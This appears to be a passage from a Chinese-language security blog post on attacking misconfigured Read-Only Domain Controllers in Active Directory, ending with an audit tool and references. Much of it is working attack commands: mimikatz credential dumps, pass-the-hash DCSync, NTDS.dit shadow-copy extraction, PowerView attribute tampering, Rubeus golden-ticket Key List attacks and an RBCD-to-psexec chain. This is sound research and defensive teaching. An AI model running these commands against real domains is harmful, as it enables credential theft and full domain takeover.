RODC（只读域控制器）的 Directory Services Restore Mode（DSRM）密码很可能与可写域控制器上设置的密码相同。Microsoft 在其名为 “[*DS Restore Mode Password Maintenance*](https://learn.microsoft.com/zh-cn/archive/blogs/askds/ds-restore-mode-password-maintenance)” 的文档中提供了详细的说明。企业/组织管理员可以通过组策略设置，将 DSRM 的密码与任何一个域用户的密码自动化同步，如果组策略应用于域控制器组织单位中的所有系统，它将影响所有的可写域控制器和只读域控制器。并且，该文档中并未提供建议将只读域控制器排除在此配置之外。

如果攻击者接管了 RODC，可以通过转储本地 SAM 数据库来提取 DSRM 账户凭据，如下所示，RODC 上名为 “Administrator” 的本地管理员帐户即为 DSRM 账户。

```powershell
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
```

![image-20231124125351711](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231124125351711.png)

如果当前组策略存在上述的问题，攻击者可以尝试用 DSRM 账户凭据，通过网络向可写域控制器进行身份验证。例如通过哈希传递执行 DCSync 转储所有域哈希，如下所示。控制 DSRM 账户登陆行为的 DsrmAdminLogonBehavior 注册表键值必须设置为 2。

```bash
python3 secretsdump.py DC01/Administrator@dc01.corp.local -hashes :6065837014ee7e5c1081b002153ca05d -just-dc
```

![image-20231124130425837](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231124130425837.png)

# Misconfiguration of RODC in Real-world

在前文中，我们已经介绍了在只读域控制器（RODC）上可行的几种攻击技术。尽管这些技术在某种程度上存在一些限制，但只要存在与其相关的配置错误，它们就可能成为攻击者通向领域主导地位的通道。请谨记，绝对安全的系统是不存在的。

在本节中，我们将探讨一些在现实世界中常见的配置，通过利用前文介绍的攻击方法，攻击者有可能滥用这些配置来破坏域环境。

## Misconfig #1 - Unexpected Credential Caching

### Misconfiguration in PRP

通常情况下，由于管理员的错误配置或疏忽操作，RODC 能够存储的账户凭据比预期的要多。例如，企业或组织中的管理员为了使用 RODC 进行身份验证，往往会通过配置密码复制策略（PRP），允许 “Authenticated Users” 、“Domain Users” 或 “RODC Admins” 组在 RODC 上存储密码。这不是一个好主意，因为环境中的大量用户的密码最终将被缓存在具有此配置的 RODC 上。

通过 PowerView.ps1 枚举 RODC 的 msDS-RevealOnDemandGroup  属性，我们可以查看所有允许密码被复制到 RODC 的组，如下所示。

```powershell
Get-ADComputer RODC -Properties msDS-RevealOnDemandGroup
```

![image-20231123111532685](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123111532685.png)

从上图中可以看到，除了默认的 Allowed RODC Password Replication Group 组外，Domain Users 组也被添加到了密码复制策略，并且策略为允许。

为了进一步确定哪些账户的密码曾被复制到了 RODC，我们还需要枚举 msDS-RevealedList 属性，如下所示。

```powershell
$FormatEnumerationLimit = -1
Get-ADComputer RODC -Properties msDS-RevealedList
```

![image-20231123112229760](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123112229760.png)

从结果中可以看到，以下账户的密码被复制到了 RODC：

- 用户账户：
  - Alice
  - IISAdmin
  - Marcus
  - RodcAdmin
- 计算机账户：
  - MHCOMPUTER$
  - WIN-IISSERVER$

导致机器账户的密码被复制的原因可能是管理员在配置密码复制策略时，将 Authenticated Users 组设为了允许。

如果攻击者接管了 RODC，可以用卷影拷贝技术提取 NTDS.dit，并转储其中存储的域账户凭据，如下所示。

（1）在 RODC 上执行以下命令，创建一个 C 盘的卷影拷贝：

```
vssadmin create shadow /for=C:
```

![image-20231123104050169](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123104050169.png)

（2）然后在创建的卷影拷贝中将 ntds.dit 复制出来：

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\ntds.dit
```

![image-20231123104232300](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123104232300.png)

最后，可以将刚刚创建的卷影拷贝删除：

```
vssadmin delete shadows /for=c: /quiet
```

（3）提取出 ntds.dit 后，还需要转储 SYSTEM 注册表，因为 SYSTEM 中存放着 ntds.dit 的密钥：

```
reg save hklm\system c:\system.save
```

![image-20231123104509991](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123104509991.png)

（4）最后，我们可以用 Impacket 套件中的 secretsdump.py 工具提取出 ntds.dit 中的域凭据：

```bash
python3 secretsdump.py -ntds ntds.dit -system system.save local
```

![image-20231123105322755](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123105322755.png)

其中，如果 NTLM 值为 31d6cfe0d16ae931b73c59d7e0c089c0，则为空密码，说明该用户密码还未复制到 RODC 上。

### Unexpected Permissions in Replication

默认情况下，仅包含可写域控制器的 Enterprise Domain Controllers 组在域分区上具有 “Replicating Directory Changes All” 权限。例如，在 Active Directory 中的 “DC=corp,DC=local” 对象上。

然而，在错误配置的情况下，只读域控制器（RODC）也可能在域上具有 “Replicating Directory Changes All” 权限。这是可能由管理员主动授予的，可能是直接授予 “Read-only Domain Controllers” 或 “Enterprise Read-only Domain Controllers” 组、RODC 对象，或通过其他组成员身份间接授予的。

通常，RODC 仅在用户帐户是 “Allowed RODC Password Replication Group” 的成员或在 RODC 的 msDS-RevealOnDemandGroup 属性中列出时，才会复制用户密码。

通过 “Replicating Directory Changes All” 权限，所有用户属性，包括密码，都会从上游可写域控制器复制到 RODC，就好像 RODC 是普通的读写域控制器（RWDC）一样。

### Unexpected LSA Cache

当创建一个 RODC 时，会在安装导向中允许网络管理员配置 “Delegated administrator account” 选项，如果管理员忽视该选项该选项的配置，那么该选项将保持默认为空的状态，如下所示。

![image-20231122144521283](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231122144521283.png)

当该服务器提升为只读域控制器后，如果管理员仍未为这台 RODC 委派管理权限，那么只有域管理员才能登陆这台 RODC。

这意味着每次维护这台 RODC 时，都会将域管理员的凭据缓存在 LSA 进程中。这种情况是非常危险的，如果攻击者接管了这台 RODC，则可以用 Mimikatz 等工具转储域管理员的凭据，如下所示。

```powershell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

![image-20231123114600849](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231123114600849.png)

## Misconfig #2 - Control of The RODC Active Directory Computer Object

控制活动目录中 RODC 计算机对象是非常危险的事情。这提供了可靠的域提升路径，有效地访问域中的任何资源。它允许攻击者通过修改 ManagedBy 属性，从而完全接管 RODC 主机。此外，最严重的是，攻击者可以修改 RODC 的 msDS-NeverRevealGroup 和 msDS-RevealOnDemandGroup 属性，在其中添加/删除任何属于零级（Tier Zero）的安全主体，包括域管理员，这使得 RODC 能够获取这些主体的凭据并在域中提升权限。

### Take over RODC Manage Delegation

通过修改 RODC 的 ManagedBy 属性，攻击者可以将 RODC 的管理权限委派给任意可控的域用户，如下所示。

```powershell
Import-Module .\PowerView.ps1
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=corp,DC=local' -Set @{'managedBy'='CN=Marcus,CN=Users,DC=corp,DC=local'}
```

之后，攻击者可以通过这个用户登录到 RODC，并获取 RODC 的完全控制权限。

### Domain Privilege Escalation

接管 RODC 之后，攻击者可以转储 RODC Krbtgt 账户凭据。通过修改 RODC 的 msDS-NeverRevealGroup 和 msDS-RevealOnDemandGroup 属性并借助 Key List Attack 最终可以实现域提权，如下所示。

（1）将域管理员账户添加到 RODC 的 msDS-RevealOnDemandGroup 属性中：

```powershell
# 导入 PowerView 模块
Import-Module .\PowerView.ps1
# 获取当前属性值
Get-DomainObject 'CN=RODC,OU=Domain Controllers,DC=corp,DC=local' -Properties 'msDS-RevealOnDemandGroup' | Select-Object -ExpandProperty 'msDS-RevealOnDemandGroup'
# 设置新的属性值
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=corp,DC=local' -Set @{'msDS-RevealOnDemandGroup'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=corp,DC=local', 
    'CN=Domain Users,CN=Users,DC=corp,DC=local',
    'CN=Administrator,CN=Users,DC=corp,DC=local',
    'CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=corp,DC=local'
)}
```

![image-20231124151811214](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231124151811214.png)

（2）暂时将 RODC 的 msDS-NeverRevealGroup 属性中值清空：

```powershell
# 导入 PowerView 模块
Import-Module .\PowerView.ps1
# 获取当前属性值
Get-DomainObject 'CN=RODC,OU=Domain Controllers,DC=corp,DC=local' -Properties 'msDS-NeverRevealGroup' | Select-Object -ExpandProperty 'msDS-NeverRevealGroup'
# 清空 msDS-NeverRevealGroup 的属性值
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=corp,DC=local' -Clear 'msDS-NeverRevealGroup'
# 恢复 msDS-NeverRevealGroup 的属性值
Set-DomainObject -Identity 'CN=RODC,OU=Domain Controllers,DC=corp,DC=local' -Set @{'msDS-NeverRevealGroup'=@(
    'CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local', 
    'CN=Account Operators,CN=Builtin,DC=corp,DC=local',
    'CN=Server Operators,CN=Builtin,DC=corp,DC=local',
    'CN=Backup Operators,CN=Builtin,DC=corp,DC=local',
    'CN=Administrators,CN=Builtin,DC=corp,DC=local'
)}
```

（3）之后，我们借助前文 “*Key List Attack*” 部分中记录的过程，为域管理员用户 Administrator 伪造一个 Golden Tickets，并向可写域控的 krbtgt 服务发起包含 KERB-KEY-LIST-REQ 结构的 KRB_TGS_REQ 请求，最终将获取到 Administrator 用户的哈希值，如下所示。

```powershell
# 为 Administrator 用户伪造 Golden Tickets
Rubeus.exe golden /rodcNumber:17748 /rc4:74379bc566c6ab7ccdfbb7388f303cef /user:Administrator /id:500 /domain:corp.local /sid:S-1-5-21-1076904399-1612789786-3660608273
# 发起 Key List 请求
Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/corp.local /dc:dc01.corp.local /ticket:<Base64EncodedTicket>
```

![image-20231124153236027](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231124153236027.png)

（4）最后通过哈希传递即可获取可写域控制器权限。

## Misconfig #3 - Control of The 'Allowed/Denied RODC Password Replication Group'

控制域中 Allowed/Denied RODC Password Replication Group 对象允许攻击者任意添加或删除组中的成员，从而控制可以复制 RODC 的账户凭据。例如，通过修改 Allowed RODC Password Replication Group 组对象的 member 属性，将特权账户例如域管理员账户添加到 Allowed RODC Password Replication Group 组中，如下所示。

```powershell
# 导入 PowerView 模块
Import-Module .\PowerView.ps1
# 获取当前属性值
Get-DomainObject 'CN=Allowed RODC Password Replication Group,CN=Users,DC=corp,DC=local' -Properties 'member' | Select-Object -ExpandProperty 'member'
# 设置新的属性值
Set-DomainObject -Identity 'CN=Allowed RODC Password Replication Group,CN=Users,DC=corp,DC=local' -Set @{'member'=@(
    'CN=Allowed RODC Password Replication Group,CN=Users,DC=corp,DC=local', 
    'CN=Domain Users,CN=Users,DC=corp,DC=local',
    'CN=Administrator,CN=Users,DC=corp,DC=local'
)}
```

（2）如果有必要，暂时将 Denied RODC Password Replication Group 对象的 member 属性中值清空：

```powershell
# 导入 PowerView 模块
Import-Module .\PowerView.ps1
# 获取当前属性值
Get-DomainObject 'CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local' -Properties 'member' | Select-Object -ExpandProperty 'member'
# 清空 member 的属性值
Set-DomainObject -Identity 'CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local' -Clear 'member'
# 恢复 member 的属性值
Set-DomainObject -Identity 'CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local' -Set @{'member'=@(
    'CN=Denied RODC Password Replication Group,CN=Users,DC=corp,DC=local', 
    'CN=Account Operators,CN=Builtin,DC=corp,DC=local',
    'CN=Server Operators,CN=Builtin,DC=corp,DC=local',
    'CN=Backup Operators,CN=Builtin,DC=corp,DC=local',
    'CN=Administrators,CN=Builtin,DC=corp,DC=local'
)}
```

需要注意的是，该情景只有在接管了 RODC 主机之后才存在利用的机会，因为需要从 RODC 上的 NTDS.dit 中导出已复制的用户凭据。此外，由于 Denied RODC Password Replication Group 组中明确禁止了特权账户凭据的复制，往往需要修改 Denied RODC Password Replication Group 组后才能使得特权账户的凭据被复制到 RODC，但允许同时控制这两个组的错误配置发生的可能性比较小。

## Misconfig #4 - Control of The 'RODC Admins'

IT 团队在创建 RODC 后，往往会将 RODC 的管理权限委派给一个用户或组（在本篇文章中统称为 “RODC Admins”）。由于 RODC Admins 用户或组通常是企业/组织自定义的，并且默认情况下不受 AdminSDHolder 等系统机制的保护，因此容易存在错误配置的 DACL。

如果攻击者可以控制域中 RODC Admins 用户或组对象，则允许向组内添加当前可控的用户，或直接登陆并完全控制 RODC 主机。这里，我们介绍另外两种利用方法，在不直接登陆 RODC Admins 用户的情况下接管 RODC 并实现持久性后门。

被委派了 RODC 管理权限的用户或组默认对 RODC 的计算机对象拥有 WriteAccountRestrictions DACL，其中包含足够的权限来修改 RODC 对象的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，以进行基于资源的约束委派（RBCD）攻击。我们用 Impacket 项目来进行演示。

（1）首先用 addcomputer.py 创建一个新的计算机账户，如下所示。

```bash
python3 addcomputer.py corp.local/RodcAdmin -hashes :9b6208bad3e240e2b56b46832563b6b2 -computer-name NEWCOMPUTER\$ -computer-pass Passw0rd -dc-ip dc01.corp.local
```

![image-20231126172738755](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231126172738755.png)

（2）将 NEWCOMPUTER 的 SID 添加到 RODC 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性中，以设置 Kerberos RBCD，如下所示。

```bash
python3 rbcd.py corp.local/RodcAdmin -hashes :9b6208bad3e240e2b56b46832563b6b2 -delegate-from NEWCOMPUTER\$ -delegate-to RODC\$ -dc-ip dc01.corp.local -action write
```

![image-20231126173231903](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231126173231903.png)

（3）通过 NEWCOMPUTER 账户代表域管理员用户申请针对 RODC 上 CIFS 服务的 Kerberos 票据，如下所示。

```bash
python3 getST.py corp.local/NEWCOMPUTER\$:Passw0rd -spn cifs/rodc.corp.local -impersonate Administrator -dc-ip dc01.corp.local
```

![image-20231126173607359](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231126173607359.png)

（4）最后，我们可以使用这个票据随时获取 RODC 服务器控制权限，如下所示。

```bash
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k corp.local/Administrator@rodc.corp.local -no-pass -dc-ip dc01.corp.local
```

![image-20231126174245180](/assets/posts/2023-11-27-revisiting-a-abuse-of-read-only-domain-controllers/image-20231126174245180.png)

# SharpRODC

为了对只读域控制器的安全性进行审计，我创建了 [SharpRODC](https://github.com/wh0amitz/SharpRODC) 项目，这是一个简单的 .NET 工具，用于与 RODC 相关的错误配置。

该工具从活动目录中枚举以下内容：

- RODC 对象的 DACL
- RODC 的 Krbtgt 账户
- “Allowed RODC Password Replication Group” 对象的 DACL
- “Denied RODC Password Replication Group” 对象的 DACL
- RODC 对象的 managedBy 属性值
- 委派了 RODC 管理权限的用户或组的 DACL
- RODC 对象的 msDS-RevealOnDemandGroup 属性值
- RODC 对象的 msDS-NeverRevealGroup 属性值
- RODC 对象的 msDS-RevealedList 属性值
- RODC 在域分区对象上的 DACL

# Reference

- [AD DS: Read-Only Domain Controllers](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc732801(v=ws.10))

- [Appendix A: RODC Technical Reference Topics](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc754218(v=ws.10))

- [Administering the Password Replication Policy](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc754646(v=ws.10))

- [RODC Filtered Attribute Set, Credential Caching, and the Authentication Process with an RODC](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-r2-and-2008/cc753459(v=ws.10))

- [RODC replicates passwords when it's granted incorrect permissions in Windows Server](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/rodc-replicates-passwords-grant-incorrect-permissions)

- [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory](https://adsecurity.org/?p=3592)

- [At the Edge of Tier Zero: The Curious Case of the RODC](https://shenaniganslabs.io/2023/01/25/RODCs.html)

